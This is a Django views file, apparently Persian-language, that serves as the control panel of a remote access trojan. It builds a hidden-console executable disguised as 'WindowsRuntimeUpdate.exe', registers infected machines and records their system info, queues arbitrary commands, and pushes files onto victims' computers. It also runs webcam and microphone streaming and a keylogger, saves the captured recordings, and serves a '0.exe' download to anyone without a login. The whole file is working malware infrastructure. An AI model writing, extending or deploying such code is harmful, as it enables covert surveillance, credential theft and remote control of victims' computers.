import os
import subprocess
import shutil
import uuid
import logging
import psutil
import wave
import zipfile
import base64
import json
from django.conf import settings
from django.http import FileResponse, HttpResponse, JsonResponse
from django.shortcuts import render, redirect
from django.utils import timezone
from django.contrib.auth.decorators import login_required
from django.views.decorators.csrf import csrf_exempt
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from .models import Client, ClientActivity, Notification
from .serializers import ClientSerializer, ClientActivitySerializer, NotificationSerializer
from datetime import timedelta

logger = logging.getLogger(__name__)

# Helper functions
def create_activity(client, activity_type, description, details=None):
    """Create a new activity log"""
    details = details or {}
    return ClientActivity.objects.create(
        client=client,
        activity_type=activity_type,
        description=description,
        details=details
    )

def create_notification(client=None, notification_type='info', title='', message=''):
    """Create a new notification"""
    return Notification.objects.create(
        client=client,
        notification_type=notification_type,
        title=title,
        message=message
    )

# View functions
@login_required
def index(request):
    clients = Client.objects.all().order_by('-last_seen')
    online_count = clients.filter(last_seen__gte=timezone.now() - timedelta(seconds=30)).count()
    offline_count = clients.count() - online_count

    recent_activities = ClientActivity.objects.all().order_by('-created_at')[:5]
    notifications = Notification.objects.filter(is_read=False).order_by('-created_at')[:5]

    return render(request, 'index.html', {
        'clients': clients,
        'online_count': online_count,
        'offline_count': offline_count,
        'recent_activities': recent_activities,
        'notifications': notifications
    })

@login_required
def cmd_page(request, client_id):
    try:
        client = Client.objects.get(client_id=client_id)

        create_activity(
            client=client,
            activity_type='connection',
            description=f'دسترسی به پنل مدیریت برای کلاینت {client.display_name or client.client_id}'
        )

        activities = client.activities.all().order_by('-created_at')[:10]
        notifications = client.notifications.filter(is_read=False).order_by('-created_at')[:5]

        return render(request, 'cmd.html', {
            'client': client,
            'activities': activities,
            'notifications': notifications,
            'system_info': client.system_info
        })
    except Client.DoesNotExist:
        logger.error(f"Client with ID {client_id} not found")
        return render(request, 'cmd.html', {'error': 'کلاینت یافت نشد'})

@login_required
def update_client_name(request, client_id):
    if request.method == 'POST':
        try:
            client = Client.objects.get(client_id=client_id)
            new_name = request.POST.get('new_name', '').strip()

            if new_name:
                old_name = client.display_name or client.client_id
                client.display_name = new_name
                client.save()

                create_activity(
                    client=client,
                    activity_type='other',
                    description=f'تغییر نام کلاینت از {old_name} به {new_name}'
                )

                create_notification(
                    client=client,
                    notification_type='success',
                    title='تغییر نام موفق',
                    message=f'نام کلاینت با موفقیت به {new_name} تغییر یافت'
                )

                return JsonResponse({
                    'status': 'success',
                    'new_name': new_name,
                    'client_id': client.client_id
                })

        except Client.DoesNotExist:
            pass

    return JsonResponse({'status': 'error'}, status=400)

@login_required
def generate_exe(request):
    try:
        folder_path = os.path.join(settings.BASE_DIR, 'APP')
        os.makedirs(folder_path, exist_ok=True)

        client_code = """
# کد client.py که در اینجا قرار می‌گیرد
"""

        client_path = os.path.join(folder_path, 'client.py')
        with open(client_path, 'w', encoding='utf-8') as f:
            f.write(client_code)

        exe_path = os.path.join(folder_path, 'WindowsRuntimeUpdate.exe')
        zip_path = os.path.join(folder_path, 'WindowsRuntimeUpdate.zip')
        icon_path = os.path.join(settings.BASE_DIR, 'static', 'icon.ico')

        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() == 'windowsruntimeupdate.exe':
                try:
                    proc.terminate()
                    proc.wait(timeout=5)
                except psutil.Error:
                    pass

        for file_path in [exe_path, zip_path, os.path.join(folder_path, 'client.spec')]:
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                except PermissionError:
                    pass

        pyinstaller_cmd = [
            'pyinstaller',
            '--onefile',
            '--noconsole',
            '--distpath', folder_path,
            '--specpath', folder_path,
            '--name', 'WindowsRuntimeUpdate'
        ]

        if os.path.exists(icon_path):
            pyinstaller_cmd.append(f'--icon={icon_path}')

        pyinstaller_cmd.append(client_path)

        result = subprocess.run(pyinstaller_cmd, timeout=300, capture_output=True, text=True)

        if not os.path.exists(exe_path):
            raise FileNotFoundError(f"فایل اجرایی ساخته نشد: {result.stderr}")

        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(exe_path, 'WindowsRuntimeUpdate.exe')

        for file_path in [client_path, os.path.join(folder_path, 'client.spec')]:
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                except Exception:
                    pass

        shutil.rmtree(os.path.join(folder_path, 'build'), ignore_errors=True)

        create_notification(
            title='ساخت فایل اجرایی',
            message='فایل WindowsRuntimeUpdate.zip با موفقیت ساخته شد',
            notification_type='success'
        )

        return redirect('index')

    except Exception as e:
        logger.error(f"Error generating EXE: {str(e)}")
        create_notification(
            title='خطا در ساخت فایل اجرایی',
            message=f'خطا در ساخت فایل: {str(e)}',
            notification_type='error'
        )
        return redirect('index')



@login_required
def upload_file(request, client_id):
    if request.method == 'POST' and request.FILES.get('file'):
        try:
            client = Client.objects.get(client_id=client_id)
            file = request.FILES['file']
            file_data = base64.b64encode(file.read()).decode('ascii')
            file_name = file.name
            path = request.POST.get('path', 'C:\\ProgramData')

            client.last_command = f"upload_file:{path}:{file_name}:{file_data}"
            client.command_id = uuid.uuid4()
            client.last_seen = timezone.now()
            client.save()

            create_activity(
                client=client,
                activity_type='file',
                description=f'آپلود فایل {file_name} به مسیر {path}',
                details={'file_name': file_name, 'size': file.size, 'path': path}
            )

            create_notification(
                client=client,
                notification_type='success',
                title='آپلود فایل',
                message=f'فایل {file_name} با موفقیت به مسیر {path} آپلود شد'
            )

            return HttpResponse(status=200)

        except Client.DoesNotExist:
            return HttpResponse(status=404)

    return HttpResponse(status=400)

# API Views
class ClientRegisterView(APIView):
    def post(self, request):
        client_id = request.data.get('client_id')
        token = request.data.get('token')
        system_info = request.data.get('info', {})

        if not client_id or not token:
            return Response({'error': 'client_id and token required'}, status=status.HTTP_400_BAD_REQUEST)

        client, created = Client.objects.get_or_create(
            client_id=client_id,
            defaults={
                'token': token,
                'last_seen': timezone.now(),
                'system_info': system_info
            }
        )

        if not created:
            client.token = token
            client.last_seen = timezone.now()
            client.system_info = system_info
            client.save()

        if created:
            create_activity(
                client=client,
                activity_type='connection',
                description='کلاینت جدید ثبت شد',
                details={'client_id': client_id}
            )

            create_notification(
                title='اتصال جدید',
                message=f'کلاینت جدید با شناسه {client_id} متصل شد',
                notification_type='info'
            )

        serializer = ClientSerializer(client)
        return Response(
            serializer.data,
            status=status.HTTP_201_CREATED if created else status.HTTP_200_OK
        )

class ClientCommandView(APIView):
    def get(self, request, client_id):
        try:
            client = Client.objects.get(client_id=client_id)
            commands = []

            if client.last_command and client.command_id:
                commands.append({
                    'id': str(client.command_id),
                    'text': client.last_command
                })

            return Response(commands, status=status.HTTP_200_OK)

        except Client.DoesNotExist:
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

    def post(self, request, client_id):
        try:
            client = Client.objects.get(client_id=client_id)
            command = request.data.get('command')

            if not command:
                return Response({'error': 'command required'}, status=status.HTTP_400_BAD_REQUEST)

            logger.debug(f"Received command: {command}")

            if command.lower() in ['webcam', 'weblive', 'webmicrophone']:
                client.is_streaming = True
                client.stream_type = command.lower()

                # Create activity
                create_activity(
                    client=client,
                    activity_type='stream',
                    description=f'شروع استریم {command}',
                    details={'stream_type': command}
                )

            elif command.lower() == 'stop_stream':
                client.is_streaming = False
                stream_type = client.stream_type
                client.stream_type = None

                # Create activity
                create_activity(
                    client=client,
                    activity_type='stream',
                    description=f'توقف استریم {stream_type}'
                )

            client.last_command = command
            client.command_id = uuid.uuid4()
            client.last_seen = timezone.now()
            client.save()

            output = client.last_output or 'Waiting for response...'
            return Response({
                'status': 'command sent',
                'command_id': str(client.command_id),
                'output': output
            }, status=status.HTTP_200_OK)

        except Client.DoesNotExist:
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

class ClientPollView(APIView):
    def get(self, request, client_id):
        try:
            client = Client.objects.get(client_id=client_id)
            client.last_seen = timezone.now()
            client.save()

            serializer = ClientSerializer(client)
            return Response(serializer.data, status=status.HTTP_200_OK)

        except Client.DoesNotExist:
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

    def post(self, request, client_id):
        try:
            client = Client.objects.get(client_id=client_id)
            output = request.data.get('output')
            command_id = request.data.get('command_id')

            if output:
                client.last_output = output
                client.last_seen = timezone.now()

                # If this is a response to a command, clear the command
                if command_id and str(client.command_id) == command_id:
                    client.last_command = None
                    client.command_id = None

                client.save()

                # Create activity
                create_activity(
                    client=client,
                    activity_type='command',
                    description='اجرای دستور',
                    details={
                        'command': client.last_command,
                        'output': output[:200] + '...' if len(output) > 200 else output
                    }
                )

            return Response({'status': 'output received'}, status=status.HTTP_202_ACCEPTED)

        except Client.DoesNotExist:
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

class StreamView(APIView):
    def post(self, request, client_id, stream_type):
        try:
            client = Client.objects.get(client_id=client_id)
            data = request.data.get('data')

            if data:
                client.last_output = data
                client.last_seen = timezone.now()
                client.save()

                return Response({'status': 'data received'}, status=status.HTTP_202_ACCEPTED)

            return Response({'error': 'no data provided'}, status=status.HTTP_400_BAD_REQUEST)

        except Client.DoesNotExist:
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

    def get(self, request, client_id, stream_type):
        try:
            client = Client.objects.get(client_id=client_id)
            data = client.last_output

            if data and not data.startswith('Error'):
                return Response({'data': data}, status=status.HTTP_200_OK)

            return Response({'data': data or 'No data available'}, status=status.HTTP_200_OK)

        except Client.DoesNotExist:
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

# New endpoint for keylogger
class KeyloggerView(APIView):
    def post(self, request, client_id):
        try:
            client = Client.objects.get(client_id=client_id)
            action = request.data.get('action')
            
            if action == 'start':
                client.last_command = 'start_keylogger'
                output = "Keylogger started"
            elif action == 'stop':
                client.last_command = 'stop_keylogger'
                output = "Keylogger stopped"
            elif action == 'get_logs':
                client.last_command = 'get_keylogs'
                output = "Keylogs retrieved"
            else:
                return Response({'error': 'Invalid action'}, status=status.HTTP_400_BAD_REQUEST)
                
            client.command_id = uuid.uuid4()
            client.last_seen = timezone.now()
            client.save()
            
            # ایجاد فعالیت
            create_activity(
                client=client,
                activity_type='keylogger',
                description=f'Keylogger action: {action}'
            )
            
            return Response({'status': 'success', 'message': output}, status=status.HTTP_200_OK)
            
        except Client.DoesNotExist:
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

# New endpoint for recording
class RecordView(APIView):
    def post(self, request, client_id, type):
        try:
            client = Client.objects.get(client_id=client_id)
            data = client.last_output

            if not data:
                return Response({'error': 'no data to record'}, status=status.HTTP_400_BAD_REQUEST)

            # Save to media folder
            media_path = os.path.join(settings.MEDIA_ROOT, f"{type}_{uuid.uuid4()}.jpg" if type in ['webcam', 'weblive'] else f"{type}_{uuid.uuid4()}.wav")
            with open(media_path, 'wb') as f:
                f.write(base64.b64decode(data))

            create_activity(
                client=client,
                activity_type='record',
                description=f'ظبط {type}',
                details={'file': media_path}
            )

            return Response({'status': 'recorded', 'message': 'فایل با موفقیت ذخیره شد'}, status=status.HTTP_200_OK)

        except Client.DoesNotExist:
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

class ClientActivitiesView(APIView):
    def get(self, request, client_id):
        try:
            client = Client.objects.get(client_id=client_id)
            activities = client.activities.all().order_by('-created_at')[:10]
            serializer = ClientActivitySerializer(activities, many=True)
            return Response(serializer.data, status=status.HTTP_200_OK)

        except Client.DoesNotExist:
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

class NotificationsView(APIView):
    def get(self, request, client_id=None):
        if client_id:
            try:
                client = Client.objects.get(client_id=client_id)
                notifications = client.notifications.filter(is_read=False).order_by('-created_at')
            except Client.DoesNotExist:
                return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)
        else:
            notifications = Notification.objects.filter(is_read=False).order_by('-created_at')

        serializer = NotificationSerializer(notifications, many=True)
        return Response(serializer.data, status=status.HTTP_200_OK)

    def post(self, request, notification_id):
        try:
            notification = Notification.objects.get(id=notification_id)
            notification.is_read = True
            notification.save()
            return Response({'status': 'marked as read'}, status=status.HTTP_200_OK)
        except Notification.DoesNotExist:
            return Response({'error': 'notification not found'}, status=status.HTTP_404_NOT_FOUND)
        

from django.http import FileResponse
import os

def download_zero(request):
    # مسیر فایل 0.exe (یک سطح بالاتر از views.py در پوشه APP)
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))  # یک سطح عقب
    file_path = os.path.join(base_dir, 'APP', '0.exe')
    
    # بررسی وجود فایل
    if not os.path.exists(file_path):
        raise FileNotFoundError("فایل 0.exe پیدا نشد!")
    
    # باز کردن فایل و ارسال آن برای دانلود
    file = open(file_path, 'rb')
    response = FileResponse(file, content_type='application/octet-stream')
    response['Content-Disposition'] = 'attachment; filename="0.exe"'
    response['Content-Length'] = os.path.getsize(file_path)  # افزودن اندازه فایل
    return response